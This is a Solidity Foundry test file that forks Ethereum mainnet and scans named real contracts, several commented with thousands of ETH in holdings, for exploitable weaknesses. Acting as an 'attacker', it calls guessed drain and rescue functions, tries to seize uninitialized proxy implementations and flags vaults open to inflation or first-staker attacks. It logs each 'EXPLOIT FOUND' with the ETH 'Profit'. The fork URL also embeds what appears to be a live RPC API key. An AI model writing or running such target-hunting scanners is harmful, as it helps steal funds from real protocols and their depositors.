// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVault {
    function deposit(uint256 amount, address receiver) external returns (uint256);
    function withdraw(uint256 assets, address receiver, address owner) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
    function totalAssets() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function convertToShares(uint256 assets) external view returns (uint256);
    function convertToAssets(uint256 shares) external view returns (uint256);
    function previewDeposit(uint256 assets) external view returns (uint256);
    function previewRedeem(uint256 shares) external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function approve(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
    function allowance(address, address) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

interface IFlashLoan {
    function flashLoan(address, address, uint256, bytes calldata) external returns (bool);
}

interface IRewardDistributor {
    function claim() external;
    function claimable(address) external view returns (uint256);
    function stake(uint256) external;
    function withdraw(uint256) external;
    function earned(address) external view returns (uint256);
    function rewardRate() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function lastUpdateTime() external view returns (uint256);
}

contract ImmediateVulnSearch is Test {
    // Known high-value contracts to analyze
    address constant SAVINGS_ACCOUNT = 0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6;
    address constant DOLA_SAVINGS = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DAI = 0x6b175474e89094C44DA98b954eeCD456E439D4d4;
    address constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // Flash loan providers
    address constant AAVE_POOL = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.createSelectFork("https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c");
    }

    function testSearchForUnprotectedFunctions() public {
        // List of contracts to check for unprotected privileged functions
        address[] memory targets = new address[](10);
        targets[0] = 0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6; // SavingAccount
        targets[1] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4; // DolaSavings
        targets[2] = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367; // 16k ETH contract
        targets[3] = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918; // 11k ETH contract
        targets[4] = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d; // 7.6k ETH contract
        targets[5] = 0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329; // 6.4k ETH contract
        targets[6] = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0; // 800 ETH proxy
        targets[7] = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83; // 400 ETH proxy
        targets[8] = 0x446B86A33E2a438f569B15855189e3dA28d027ba; // 621 ETH contract
        targets[9] = 0x8707f238936c12c309bfc2B9959C35828AcFc512; // EthenaLPStaking

        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 balance = target.balance;

            if (balance > 1 ether) {
                console.log("=== Target", i, "===");
                console.log("Address:", target);
                console.log("ETH Balance:", balance / 1e18, "ETH");

                // Try common unprotected functions
                vm.startPrank(attacker);

                // Try to call emergency withdraw
                (bool success,) = target.call(abi.encodeWithSignature("emergencyWithdraw()"));
                if (success) {
                    console.log("!!! VULNERABLE: emergencyWithdraw() succeeded !!!");
                }

                // Try drain
                (success,) = target.call(abi.encodeWithSignature("drain()"));
                if (success) {
                    console.log("!!! VULNERABLE: drain() succeeded !!!");
                }

                // Try withdrawETH
                (success,) = target.call(abi.encodeWithSignature("withdrawETH()"));
                if (success) {
                    console.log("!!! VULNERABLE: withdrawETH() succeeded !!!");
                }

                // Try rescue with attacker address
                (success,) = target.call(abi.encodeWithSignature("rescue(address)", attacker));
                if (success) {
                    console.log("!!! VULNERABLE: rescue() succeeded !!!");
                }

                // Try skim
                (success,) = target.call(abi.encodeWithSignature("skim(address)", attacker));
                if (success) {
                    console.log("!!! VULNERABLE: skim() succeeded !!!");
                }

                // Try collect
                (success,) = target.call(abi.encodeWithSignature("collect(address)", attacker));
                if (success) {
                    console.log("!!! VULNERABLE: collect() succeeded !!!");
                }

                vm.stopPrank();
            }
        }
    }

    function testCheckVaultPrecisionExploits() public {
        // Look for vaults with potential first-depositor attacks or rounding exploits

        // Check common vault patterns
        address[] memory vaults = new address[](5);
        vaults[0] = 0x01e3cc8E17755989ad2CAFE78A822354Eb5DdFA6;
        vaults[1] = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;
        vaults[2] = 0x889edC2eDab5f40e902b864aD4d7AdE8E412F9B1;
        vaults[3] = 0x8707f238936c12c309bfc2B9959C35828AcFc512;
        vaults[4] = 0x2C24B57e2CCd1f273045Af6A5f632504C432374F;

        for (uint256 i = 0; i < vaults.length; i++) {
            address vault = vaults[i];

            // Try to read vault state
            (bool success, bytes memory data) = vault.staticcall(abi.encodeWithSignature("totalSupply()"));
            if (success && data.length >= 32) {
                uint256 totalSupply = abi.decode(data, (uint256));

                (success, data) = vault.staticcall(abi.encodeWithSignature("totalAssets()"));
                uint256 totalAssets = success && data.length >= 32 ? abi.decode(data, (uint256)) : 0;

                console.log("=== Vault", i, "===");
                console.log("Address:", vault);
                console.log("Total Supply:", totalSupply);
                console.log("Total Assets:", totalAssets);

                // Check for inflation attack opportunity (empty vault)
                if (totalSupply == 0 && totalAssets == 0) {
                    console.log("!!! POTENTIAL: Empty vault - inflation attack possible !!!");
                }

                // Check for precision loss opportunity (very low shares)
                if (totalSupply > 0 && totalSupply < 1000) {
                    console.log("!!! POTENTIAL: Low share count - precision exploits possible !!!");
                }

                // Check for share/asset mismatch
                if (totalSupply > 0 && totalAssets > 0) {
                    uint256 ratio = (totalAssets * 1e18) / totalSupply;
                    console.log("Asset/Share Ratio:", ratio);

                    if (ratio > 1e19) {
                        console.log("!!! POTENTIAL: High ratio - possible exploit or insolvency !!!");
                    }
                }
            }
        }
    }

    function testCheckRewardDistributorExploits() public {
        // Check reward distribution contracts for timing or rounding exploits

        // DolaSavings analysis
        address dolaSavings = 0xE5f24791E273Cb96A1f8E5B67Bc2397F0AD9B8B4;

        (bool success, bytes memory data) = dolaSavings.staticcall(
            abi.encodeWithSignature("totalSupply()")
        );
        if (success && data.length >= 32) {
            uint256 totalSupply = abi.decode(data, (uint256));
            console.log("DolaSavings totalSupply:", totalSupply);

            // Check reward rate
            (success, data) = dolaSavings.staticcall(
                abi.encodeWithSignature("yearlyRewardBudget()")
            );
            if (success && data.length >= 32) {
                uint256 yearlyBudget = abi.decode(data, (uint256));
                console.log("Yearly reward budget:", yearlyBudget);

                if (yearlyBudget > 0 && totalSupply == 0) {
                    console.log("!!! POTENTIAL: Rewards available but no stakers - first staker exploit !!!");
                }
            }

            // Check if we can stake and immediately claim rewards
            (success, data) = dolaSavings.staticcall(
                abi.encodeWithSignature("rewardIndexMantissa()")
            );
            if (success && data.length >= 32) {
                uint256 rewardIndex = abi.decode(data, (uint256));
                console.log("Reward index mantissa:", rewardIndex);
            }
        }
    }

    function testDirectETHTransferExploits() public {
        // Check if contracts can receive ETH and if there's a way to drain it

        address[] memory targets = new address[](6);
        targets[0] = 0x6774Bcbd5ceCeF1336b5300fb5186a12DDD8b367; // 16k ETH
        targets[1] = 0x5efc9D10E42FB517456f4ac41EB5e2eBe42C8918; // 11k ETH
        targets[2] = 0xC82Abe4dFA94b9B5453d31274Fb7500459a0d12d; // 7.6k ETH
        targets[3] = 0x9cbDbd7Fa768Ad6E9546FF57238722fA9B925329; // 6.4k ETH
        targets[4] = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0; // 800 ETH
        targets[5] = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83; // 400 ETH

        for (uint256 i = 0; i < targets.length; i++) {
            address target = targets[i];
            uint256 initialBalance = target.balance;

            if (initialBalance > 100 ether) {
                console.log("=== High-Value Target", i, "===");
                console.log("Address:", target);
                console.log("Balance:", initialBalance / 1e18, "ETH");

                // Check for any withdrawal functions
                vm.startPrank(attacker);

                // Check if fallback/receive can be exploited via reentrancy
                uint256 attackerBalBefore = attacker.balance;

                // Try to call various withdrawal patterns
                bytes4[] memory sigs = new bytes4[](8);
                sigs[0] = bytes4(keccak256("withdraw()"));
                sigs[1] = bytes4(keccak256("withdrawAll()"));
                sigs[2] = bytes4(keccak256("exit()"));
                sigs[3] = bytes4(keccak256("claimAll()"));
                sigs[4] = bytes4(keccak256("emergencyExit()"));
                sigs[5] = bytes4(keccak256("rugPull()"));
                sigs[6] = bytes4(keccak256("sweep()"));
                sigs[7] = bytes4(keccak256("execute()"));

                for (uint j = 0; j < sigs.length; j++) {
                    (bool success,) = target.call(abi.encodeWithSelector(sigs[j]));
                    if (success && attacker.balance > attackerBalBefore) {
                        console.log("!!! EXPLOIT FOUND !!!");
                        console.log("Selector:", vm.toString(bytes32(sigs[j])));
                        console.log("Profit:", (attacker.balance - attackerBalBefore) / 1e18, "ETH");
                    }
                }

                vm.stopPrank();
            }
        }
    }

    function testCheckProxyInitialization() public {
        // Check if proxy implementations can be initialized by attacker

        // EIP-1967 implementation slot
        bytes32 IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

        address[] memory proxies = new address[](4);
        proxies[0] = 0xdD276dc5223d0120F9BF1776F38957CC8DA23Cb0; // 800 ETH proxy
        proxies[1] = 0x1B14376ee2d46aE5c27A43D902d96D4F3F264B83; // 400 ETH proxy
        proxies[2] = 0x763b8a88Ac40eDb6Cc5c13FAac1fCFf4b393218D; // TransparentUpgradeableProxy
        proxies[3] = 0x38cDB1A8207264C1A07c42c43A4c3ED4bfab7CEA; // TransparentUpgradeableProxy

        for (uint256 i = 0; i < proxies.length; i++) {
            address proxy = proxies[i];
            bytes32 implSlotValue = vm.load(proxy, IMPL_SLOT);
            address impl = address(uint160(uint256(implSlotValue)));

            if (impl != address(0)) {
                console.log("=== Proxy", i, "===");
                console.log("Proxy:", proxy);
                console.log("Implementation:", impl);
                console.log("Proxy ETH:", proxy.balance / 1e18, "ETH");

                // Check if implementation can be initialized
                vm.startPrank(attacker);

                // Try to initialize the implementation directly
                (bool success,) = impl.call(
                    abi.encodeWithSignature("initialize(address)", attacker)
                );

                if (success) {
                    console.log("!!! VULNERABLE: Implementation initialize() succeeded !!!");

                    // Check if we gained any privileges
                    (success,) = impl.staticcall(abi.encodeWithSignature("owner()"));
                    if (success) {
                        console.log("Checking owner...");
                    }
                }

                // Try common initializer variants
                (success,) = impl.call(abi.encodeWithSignature("init()"));
                if (success) console.log("!!! init() succeeded !!!");

                (success,) = impl.call(abi.encodeWithSignature("setup(address)", attacker));
                if (success) console.log("!!! setup() succeeded !!!");

                vm.stopPrank();
            }
        }
    }
}
